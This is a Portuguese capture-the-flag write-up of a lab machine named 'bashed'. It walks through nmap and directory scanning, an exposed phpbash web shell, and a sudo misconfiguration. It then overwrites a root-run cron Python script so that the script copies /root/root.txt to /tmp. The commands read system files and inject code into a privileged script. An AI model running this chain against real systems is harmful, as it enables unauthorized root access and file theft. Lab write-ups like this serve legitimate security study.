#ctfs 

# Reconhecimento inicial

Primeiro iniciamos com um scan `nmap` no IP fornecido a fim de procurarmos portas abertas no host.

```shell
└─$ nmap 10.129.95.49 -Pn --open -sC -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-27 17:48 -03
Nmap scan report for 10.129.95.49
Host is up (0.14s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
|_http-title: Arrexel's Development Site

Nmap done: 1 IP address (1 host up) scanned in 57.27 seconds
```

Temos somente a porta 80 aberta, vamos realizar um reconhecimento mais a fundo.

```shell

└─$ nmap 10.129.95.49 -Pn --open -p 80 --script="http-headers,http-enum,http-methods"
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-27 17:51 -03
Nmap scan report for 10.129.95.49
Host is up (0.13s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-headers: 
|   Date: Sun, 27 Sep 2026 20:51:53 GMT
|   Server: Apache/2.4.18 (Ubuntu)
|   Last-Modified: Mon, 04 Dec 2017 23:03:42 GMT
|   ETag: "1e3f-55f8bbac32f80"
|   Accept-Ranges: bytes
|   Content-Length: 7743
|   Vary: Accept-Encoding
|   Connection: close
|   Content-Type: text/html
|   
|_  (Request type: HEAD)
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /php/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|_  /uploads/: Potentially interesting folder
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST

Nmap done: 1 IP address (1 host up) scanned in 13.98 seconds
```

Detectamos alguns diretórios interessantes, vamos para a próxima etapa.
# Enumeração

## Serviço Web

Ao abrirmos o IP fornecido no navegador nos deparamos com a seguinte página

![[Pasted image 20260927174916.png]]

Pesquisando as tecnologias no site encontramos:

```shell
└─$ whatweb http://10.129.95.49/                            
http://10.129.95.49/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.95.49], JQuery, Meta-Author[Colorlib], Script[text/javascript], Title[Arrexel's Development Site]
```

Nada muito revelador. Continuemos com a enumeração. Busquemos diretórios além dos já detectados

```shell
└─$ dirsearch -u http://10.129.95.49/ -w /usr/share/wordlists/dirb/big.txt -x 404,500 -r
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 20469

Output File: /home/pentecostes/reports/http_10.129.95.49/__26-09-27_17-50-02.txt

Target: http://10.129.95.49/

[17:50:02] Starting: 
[17:50:45] 301 -  310B  - /css  ->  http://10.129.95.49/css/                
Added to the queue: css/
[17:50:49] 301 -  310B  - /dev  ->  http://10.129.95.49/dev/                
Added to the queue: dev/
[17:51:01] 301 -  312B  - /fonts  ->  http://10.129.95.49/fonts/            
Added to the queue: fonts/
[17:51:12] 301 -  313B  - /images  ->  http://10.129.95.49/images/          
Added to the queue: images/
[17:51:18] 301 -  309B  - /js  ->  http://10.129.95.49/js/                  
Added to the queue: js/
[17:51:45] 301 -  310B  - /php  ->  http://10.129.95.49/php/                
Added to the queue: php/
[17:52:03] 403 -  300B  - /server-status                                    
[17:52:25] 301 -  314B  - /uploads  ->  http://10.129.95.49/uploads/        
Added to the queue: uploads/
                                                                             
[17:52:40] Starting: css/
                                                                             
[17:55:17] Starting: dev/
                                                                             
[17:57:56] Starting: fonts/
                                                                             
[18:00:34] Starting: images/
                                                                             
[18:03:19] Starting: js/
                                                                             
[18:05:56] Starting: php/                                                           
                                                                             
[18:08:34] Starting: uploads/                                                       
                                                                             
Task Completed   
```

Vamos acessar essa `/dev/`

![[Pasted image 20260927175610.png]]

Temos o `.php`sobre o qual o site faz referência na descrição. Vamos acessar.

![[Pasted image 20260927175650.png]]

Abriu-se um terminal! Vamos passar comandos para ele e ver o que conseguimos.

```shell
www-data@bashed:/var/www/html/dev# ls
phpbash.min.php
phpbash.php
www-data@bashed:/var/www/html/dev# whoami
www-data
www-data@bashed:/var/www/html/dev# ls -la /home
total 16
drwxr-xr-x 4 root root 4096 Dec 4 2017 .
drwxr-xr-x 23 root root 4096 Jun 2 2022 ..
drwxr-xr-x 4 arrexel arrexel 4096 Jun 2 2022 arrexel
drwxr-xr-x 3 scriptmanager scriptmanager 4096 Dec 4 2017 scriptmanager
www-data@bashed:/var/www/html/dev# ls -la /home/arrexel
total 32
drwxr-xr-x 4 arrexel arrexel 4096 Jun 2 2022 .
drwxr-xr-x 4 root root 4096 Dec 4 2017 ..
lrwxrwxrwx 1 root root 9 Jun 2 2022 .bash_history -> /dev/null
-rw-r--r-- 1 arrexel arrexel 220 Dec 4 2017 .bash_logout
-rw-r--r-- 1 arrexel arrexel 3786 Dec 4 2017 .bashrc
drwx------ 2 arrexel arrexel 4096 Dec 4 2017 .cache
drwxrwxr-x 2 arrexel arrexel 4096 Dec 4 2017 .nano
-rw-r--r-- 1 arrexel arrexel 655 Dec 4 2017 .profile
-rw-r--r-- 1 arrexel arrexel 0 Dec 4 2017 .sudo_as_admin_successful
-r--r--r-- 1 arrexel arrexel 33 Sep 27 13:45 user.txt
www-data@bashed:/var/www/html/dev# cat /home/arrexel/user.txt
[flag user.txt]
```

Até então foi simples, vamos buscar agora escalar privilégios.

# Escalação de Privilégios

A partir daqui, por causa de um reset que fiz na máquina, o IP agora é `10.129.95.59`

Primeiro, verificamos o arquivo de usuários do sistema

```shell
www-data@bashed:/home# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
arrexel:x:1000:1000:arrexel,,,:/home/arrexel:/bin/bash
scriptmanager:x:1001:1001:,,,:/home/scriptmanager:/bin/bash
```

Depois, verificamos as permissões de usuário

```shell
www-data@bashed:/home# ls -la
www-data@bashed:/home/arrexel# sudo -l
Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

Interessantíssimo resultado. Eu como `www-data` posso executar qualquer comando como `scriptmanager`. Vamos fazer isso então, vamos executar o shell como scriptmanager

```shell
www-data@bashed:/home/arrexel# sudo -u scriptmanager -g scriptmanager id
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
```

Funcionou, vamos continuar explorando.

Analisando a raíz encontramos uma pasta interessante ( `/scripts`).

```shell
www-data@bashed:/home/scriptmanager# ls -la /
total 92
drwxr-xr-x 23 root root 4096 Jun 2 2022 .
drwxr-xr-x 23 root root 4096 Jun 2 2022 ..
-rw------- 1 root root 212 Jun 14 2022 .bash_history
drwxr-xr-x 2 root root 4096 Jun 2 2022 bin
drwxr-xr-x 3 root root 4096 Jun 2 2022 boot
drwxr-xr-x 19 root root 4140 Sep 27 14:38 dev
drwxr-xr-x 89 root root 4096 Jun 2 2022 etc
drwxr-xr-x 4 root root 4096 Dec 4 2017 home
lrwxrwxrwx 1 root root 32 Dec 4 2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x 19 root root 4096 Dec 4 2017 lib
drwxr-xr-x 2 root root 4096 Jun 2 2022 lib64
drwx------ 2 root root 16384 Dec 4 2017 lost+found
drwxr-xr-x 4 root root 4096 Dec 4 2017 media
drwxr-xr-x 2 root root 4096 Jun 2 2022 mnt
drwxr-xr-x 2 root root 4096 Dec 4 2017 opt
dr-xr-xr-x 168 root root 0 Sep 27 14:37 proc
drwx------ 3 root root 4096 Sep 27 14:38 root
drwxr-xr-x 18 root root 520 Sep 27 14:38 run
drwxr-xr-x 2 root root 4096 Dec 4 2017 sbin
drwxrwxr-- 2 scriptmanager scriptmanager 4096 Jun 2 2022 scripts
drwxr-xr-x 2 root root 4096 Feb 15 2017 srv
dr-xr-xr-x 13 root root 0 Sep 27 14:37 sys
drwxrwxrwt 10 root root 4096 Sep 27 14:47 tmp
drwxr-xr-x 10 root root 4096 Dec 4 2017 usr
drwxr-xr-x 12 root root 4096 Jun 2 2022 var
lrwxrwxrwx 1 root root 29 Dec 4 2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
```

Podemos usar nossos privilégios de usuário para verificar essa pasta.

```shell
www-data@bashed:/# sudo -u scriptmanager -g scriptmanager ls -la /scripts
total 16
drwxrwxr-- 2 scriptmanager scriptmanager 4096 Jun 2 2022 .
drwxr-xr-x 23 root root 4096 Jun 2 2022 ..
-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec 4 2017 test.py
-rw-r--r-- 1 root root 12 Sep 27 14:48 test.txt
```

Mais a fundo no arquivo python:

```shell
www-data@bashed:/# sudo -u scriptmanager -g scriptmanager cat /scripts/test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

Olha que interessante. No arquivo Python você pode escrever um código com permissão de escrita, estamos no usuário `scriptmanager` ,portanto, o arquivo criado também será desse usuário, porém, ele escreve o arquivo e o libera COM PERMISSÃO DE ROOT, isso é um comportamento esperado para um `CronJob`. Podemos criar um outro arquivo para executar como root e capturar a `/root/root.txt`.

Executei o seguinte comando com o código Python desejado.

```shell
sudo -u scriptmanager -g scriptmanager /bin/sh -c 'printf "%s\n" "import os; data=open(\"/root/root.txt\",\"r\").read(); open(\"/tmp/root.txt\",\"w\").write(data); os.chmod(\"/tmp/root.txt\",0o644)" > /scripts/test.py'
```

Esse código basicamente abre a `/root/root.txt`, cria um arquivo em tmp e envia a flag para lá. Com isso, somente façamos a leitura do arquivo em tmp e pronto.

```shell
www-data@bashed:/# ls -l /tmp/root.txt
-rw-r--r-- 1 root root 33 Sep 27 15:05 /tmp/root.txt
www-data@bashed:/# cat /tmp/root.txt
[flag root.txt]
```

